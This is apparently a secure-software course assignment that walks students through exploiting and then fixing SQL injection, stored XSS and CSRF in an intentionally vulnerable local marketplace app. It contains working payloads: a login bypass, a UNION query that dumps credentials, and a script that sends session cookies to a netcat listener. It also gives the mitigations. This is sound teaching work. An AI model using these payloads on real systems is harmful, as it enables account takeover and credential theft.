# CYSE 411 · Assignment 4 — Patch the Marketplace

**Course:** Secure Software Engineering
**Format:** Guided, hands-on tutorial
**Time budget:** ~3 hours
**Deliverable:** a link to **your own** Git repo, submitted on Canvas

---

## The story

**CampusSwap** is a small student marketplace: people list textbooks and dorm
gear, comment on listings, and send each other "credits." It works — and it is
full of security holes. In this tutorial you play both roles: first the
**attacker** who proves each hole is real, then the **engineer** who closes it
without breaking the app.

You will work through three classic web vulnerabilities:

| # | Vulnerability | Lives in | You'll fix it with |
|---|---------------|----------|--------------------|
| V1 | **SQL Injection** | `POST /login`, `GET /search` | Parameterized queries |
| V2 | **Stored XSS** | comments on `/item/:id` | Output encoding **+ Content-Security-Policy** |
| V3 | **CSRF** | `POST /wallet/transfer` | Anti-CSRF **cookie token** + `SameSite` cookies |

## How this tutorial works

Every part has the **same four beats** — do them in order:

> 🎓 **Learn** — read the concept and, where you see a **▶ WATCH** box, watch the
> short video *before continuing*.
> 🗡️ **Attack** — follow the numbered steps to run a real exploit.
> 🛠️ **Fix** — apply the mitigation using the recipe given.
> ✅ **Check** — confirm the exploit now fails and normal use still works.

The vulnerable code is **labelled for you**: search the source for `VULN [V1]`,
`VULN [V2]`, `VULN [V3]` to jump to each sink. Keep edits inside those blocks —
a tidy 3-line diff beats a rewrite.

---

## Step 0 · Get it running  (≈15 min)

**Prerequisites:** Node.js 18+ (tested on 18 / 20 / 22) and Git.

```bash
git clone <starter-url> campusswap-a4
cd campusswap-a4/vulnerable-app
npm install
npm run seed      # builds data/campusswap.db with demo users + items
npm start         # -> http://localhost:3000
```

Open **http://localhost:3000**. You should see the marketplace with a red
"intentionally vulnerable" banner. Demo accounts:

| username | password | credits |
|----------|----------|---------|
| `alice`  | `sunshine22` | 500 |
| `bob`    | `hunter2!`   | 320 |
| `mallory`| `letmein123` | 40 |
| `quartermaster` | *(hidden — you'll recover it in Part 1)* | 9999 |

> 💡 **Reset anytime** with `npm run seed`. Do it before recording each exploit
> so balances/comments start clean.
>
> 🔒 **Safety:** this app is deliberately insecure — run it **only** on
> `localhost`, never on a public server.

Now run the self-check once, *before* fixing anything, so you can watch the score
flip later:

```bash
bash ../verify.sh http://localhost:3000     # expect: EXPLOITABLE 3 / 3
```

✅ **Checkpoint 0:** the home page loads, you can log in as `alice`, and the
self-check prints **EXPLOITABLE 3 / 3**.

---

## Part 1 · SQL Injection  (≈40 min)

### 🎓 Learn
SQL injection happens when user input is **glued into a query string** instead of
being sent as a **parameter**. The database can't tell your data from the
developer's SQL, so text like `' OR '1'='1` becomes *logic*.

Open `server.js`, find `VULN [V1]` in `POST /login`:

```js
const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```

If `username` is `alice`, fine. But if `username` is `' OR 1=1 -- ` the query
becomes:

```sql
SELECT * FROM users WHERE username = '' OR 1=1 -- ' AND password = '...'
```

`OR 1=1` is always true and `-- ` (two dashes + a space) comments out the rest,
so the DB returns the **first** user and logs you in.

### 🗡️ Attack A — log in as a specific account with no password
There's a hidden high-value account, `quartermaster`, whose password you were
never given. Log in as *that exact account*:

1. Go to the login page.
2. In the **username** box, enter a payload that (a) names `quartermaster`,
   (b) closes the string with a single quote, and (c) ends with `-- ` so the
   `AND password` clause is discarded. Type anything as the password.
3. Save the working payload in `exploits/sqli.sh` (a stub is provided).

✅ **Check A:** open `/wallet` — you should be **"Signed in as quartermaster"**
with **9999** credits.

### 🗡️ Attack B — extend it to steal data
Now use the **same idea** to exfiltrate data. `GET /search` runs a query that
returns **3 columns** (`id`, `title`, `price`). A `UNION SELECT` can append rows
from another table with the same column count. Here is the payload — you only
need to fill in the **separator** you want between username and password:

```
zzz%' UNION SELECT id, username || '____' || password, credits FROM users -- 
```

(`||` is SQLite string concatenation; replace `____` with e.g. `:`.) Put the
finished payload in `exploits/sqli.sh` and run it against `/search`.

✅ **Check B:** the results page lists **every** account's credentials —
including `quartermaster`'s real password.

### 🛠️ Fix
Change **both** sinks so input is a **bound parameter**, never concatenated:

```js
// /login
const user = db.prepare('SELECT * FROM users WHERE username = ? AND password = ?')
               .get(username, password);

// /search
const rows = db.prepare('SELECT id, title, price FROM items WHERE title LIKE ?')
               .all('%' + q + '%');
```

> 📖 [OWASP — SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

✅ **Check (Part 1):** your `sqli.sh` payloads no longer log in or leak data, and
normal login still works.

> ⭐ **Optional bonus (+5):** the app stores passwords in **plaintext** (`db.js`).
> Hash them with **bcrypt** on register and verify with `bcrypt.compareSync` on
> login (`bcryptjs` is already installed), then `npm run seed`.

---

## Part 2 · Stored XSS + Content-Security-Policy  (≈45 min)

### 🎓 Learn
**Stored** XSS is when attacker input is saved and later rendered **as HTML** to
other users. Find `VULN [V2]` in `views.js` → `renderItem`: the comment body is
inserted with `${c.body}` and never escaped, so any markup you post becomes live
DOM for everyone viewing that item. And the session cookie is set **without
`HttpOnly`**, so injected JavaScript can read `document.cookie`.

### 🗡️ Attack — inject a script into a comment
1. Log in (e.g. `mallory` / `letmein123`) and open item 1.
2. Post this comment and reload — a pop-up proves your code ran:
   ```html
   <script>alert(document.cookie)</script>
   ```
3. Now turn it into cookie theft. Start a listener in another terminal:
   ```bash
   nc -lvnp 8000
   ```
4. Post this comment:
   ```html
   <script>fetch('http://localhost:8000/steal?c='+encodeURIComponent(document.cookie))</script>
   ```
5. Open `/item/1` **as a different logged-in user** (e.g. `alice`) and watch
   their cookie arrive in your listener.
6. Record the payload + a 2–3 sentence explanation in `exploits/xss-payload.txt`.

✅ **Check:** a comment can run JavaScript in another user's browser and steal
their session.

### 🛠️ Fix — two layers (defense in depth)

**Layer 1 — output encoding.** In `views.js`, render the comment body through the
existing `esc()` helper so `<script>` becomes inert text. This is the primary fix.

**Layer 2 — Content-Security-Policy.** A CSP tells the browser *which* scripts may
run, so even if you miss an escaping bug, injected scripts won't execute. Watch
the video, then add the header.

> ▶ **WATCH before implementing CSP (≈9 min):**
> **Content Security Policy Explained** — https://www.youtube.com/watch?v=-LjPRzFR5f0
> While watching, note (1) why `script-src 'self'` blocks inline `<script>`, and
> (2) why `'unsafe-inline'` would defeat the whole point.

Add this header to **every** response (a tiny middleware near the top of
`server.js` is easiest):

```js
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy',
    "default-src 'self'; script-src 'self'; style-src 'self'; " +
    "img-src 'self' data:; object-src 'none'; base-uri 'self'; frame-ancestors 'none'");
  next();
});
```

The app has **no inline scripts**, so this won't break anything.

**Layer 3 — `HttpOnly` cookie.** Where the session cookie is set
(`res.cookie('sid', …)`), add `httpOnly: true` so JavaScript can't read it.

> 📖 [MDN — Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP)

✅ **Check (Part 2):** the comment shows as plain text (no pop-up), responses
carry a `Content-Security-Policy` header, and the `sid` cookie shows `HttpOnly`.

---

## Part 3 · CSRF — cookie tokens  (≈50 min)

### 🎓 Learn
The browser attaches your CampusSwap cookie to **every** request to the app —
**even requests triggered by another website.** `VULN [V3]`,
`POST /wallet/transfer`, moves credits but is authenticated **only** by that
cookie, so any page you visit can submit a transfer *as you*.

> ▶ **WATCH (≈5 min):**
> **Cross Site Request Forgery — Computerphile (Tom Scott)** — https://www.youtube.com/watch?v=vRBihr41JTo
> The defense to focus on: a secret **per-session token** placed in the form that
> a cross-site attacker cannot read or guess (the *synchronizer token pattern*),
> plus the `SameSite` cookie attribute.
>
> *(Optional, deeper dive — PwnFunction, ≈8 min: https://www.youtube.com/watch?v=eWEgUcHPle0)*

### 🗡️ Attack — a page that spends the victim's credits
A stub attacker page is in `exploits/csrf-poc.html`.

1. Complete it so that, **on page load**, a hidden form auto-submits a transfer
   to an account you control.
2. Run the app and log in as `alice` in your browser.
3. Serve the attacker page from a **different origin**:
   ```bash
   cd exploits && python3 -m http.server 9000
   ```
4. With `alice` still logged in, open **http://localhost:9000/csrf-poc.html**.
5. Check `/wallet`: alice's balance dropped, though she never touched the form.

✅ **Check:** an off-site page moved a logged-in victim's credits. Re-seed to
reset balances.

### 🛠️ Fix — the cookie token
Follow this recipe (you only need to protect the transfer form):

1. **Make a token when a session starts.** Where you create the session on login,
   also store a random token:
   ```js
   session.csrf = crypto.randomBytes(32).toString('hex');   // crypto is built in
   ```
2. **Put it in the transfer form.** `renderWallet` already accepts a `csrf` value —
   pass it in, and add a hidden field inside the form:
   ```html
   <input type="hidden" name="_csrf" value="${csrf}">
   ```
3. **Check it on submit.** At the top of `POST /wallet/transfer`, reject the
   request unless the token matches (constant-time compare):
   ```js
   const ok = req.body._csrf &&
     crypto.timingSafeEqual(Buffer.from(req.body._csrf), Buffer.from(req.session.csrf));
   if (!ok) return res.status(403).send('CSRF token missing or invalid');
   ```
4. **Harden the cookie.** Where you set `sid`, add `sameSite: 'strict'` (and
   `secure: true` in production) so it isn't sent on cross-site requests.

> 📖 [OWASP — CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) ·
> [MDN — `SameSite` cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie/SameSite)

✅ **Check (Part 3):** the completed `csrf-poc.html` no longer moves credits, but
a legitimate transfer through the real form still works.

---

## Step 4 · Verify everything  (≈10 min)

Re-seed, start your fixed app, and run the self-check (it only runs the attacks —
it reveals no fixes, so keeping it in your repo is fine):

```bash
cd vulnerable-app && npm run seed && npm start   # terminal 1
bash ../verify.sh http://localhost:3000          # terminal 2 (from vulnerable-app/)
```

A correct submission prints **SAFE: 3 / 3** (it was **EXPLOITABLE: 3 / 3** before
you started — that's the difference you're proving).

Manual smoke test, if you prefer:
- **V1:** your `sqli.sh` payloads no longer work.
- **V2:** `<script>alert(1)</script>` shows as literal text; responses have a
  `Content-Security-Policy` header; the `sid` cookie is `HttpOnly`.
- **V3:** `csrf-poc.html` changes no balance; the real form still does.

---

## Step 5 · Make sure it runs from a clean clone

Your fixes only count if they run. In a fresh folder:

```bash
git clone <your-repo-url> check
cd check/vulnerable-app && npm install && npm run seed && npm start
```

If that serves your patched app on `http://localhost:3000`, you're good.

---

## Step 6 · Submit

On Canvas, submit **only the URL of your Git repo.** It must contain:

```
your-repo/
├── vulnerable-app/            # the app WITH YOUR FIXES
│   └── exploits/              # YOUR completed sqli.sh, xss-payload.txt, csrf-poc.html
├── verify.sh                  # fine to keep
└── WRITEUP.md                 # ~1 page: each bug + how you fixed it
```

See `SUBMISSION.md` for the exact git steps and a `WRITEUP.md` template.

> Grading is done **locally** — do not host this vulnerable app publicly.

---

## How you'll be graded (100 pts, + optional bonus)

| Area | Pts |
|------|-----|
| V1 exploit — auth bypass **and** UNION exfil both work | 15 |
| V1 fix — both sinks parameterized; normal login works | 20 |
| V2 exploit — stored XSS runs for another user | 12 |
| V2 fix — output encoding **+** CSP header **+** `HttpOnly` | 18 |
| V3 exploit — off-site `csrf-poc.html` moves a victim's credits | 12 |
| V3 fix — CSRF token **+** `SameSite`; real transfer still works | 18 |
| `WRITEUP.md` — each bug + fix explained in your own words | 5 |
| ⭐ Bonus — bcrypt password hashing | +5 |

**Don't break legitimate functionality to "fix" a bug** — an app that rejects all
logins isn't secure, it's broken. Keep every fix scoped to its `VULN` block.

## Rules & integrity
- Work individually. Discuss concepts freely; your code and write-up must be
  yours. Disclose any AI assistance per the syllabus.
- These techniques are for **this app only**. Attacking systems you don't own is
  illegal (GMU policy; Computer Fraud and Abuse Act).
